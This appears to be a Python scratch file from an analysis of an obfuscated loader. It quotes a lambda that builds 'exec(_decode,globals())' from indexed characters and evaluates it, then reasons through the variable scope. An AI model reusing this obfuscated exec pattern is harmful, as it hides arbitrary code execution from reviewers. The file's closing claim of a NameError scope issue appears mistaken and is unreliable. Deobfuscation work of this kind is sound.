# Test evaluating self._bits(_decode)
# Look at _bits definition:
# self._bits = lambda _decode:_delete[_system](f\"{self._eval[4]+self._eval[-13]+self._eval[4]+self._eval[2]}(_decode,{self._eval[6]+self._eval[11]+self._eval[14]+self._eval[1]+self._eval[0]+self._eval[11]+self._eval[18]}())\")if _delete[_system]==eval else exit()
# In f-string: {self._eval[4]+self._eval[-13]+self._eval[4]+self._eval[2]}(_decode,{...}())
# In self._bits, parameter name is _decode!
# So it constructs string: \"exec(_decode,globals())\"
# And then _delete[_system](\"exec(_decode,globals())\") evaluates that string!
# BUT in the context of eval(\"exec(_decode,globals())\"), what is variable _decode?
# Inside eval(), the local scope only has what's passed, or if globals() is passed, _decode is NOT in globals()!
# _decode was a local parameter in self._bits!
# When eval(\"exec(_decode,globals())\") runs without locals, _decode is searched in globals() -> NameError or None!
print('Discovered scope issue in eval(exec(_decode,globals()))!')
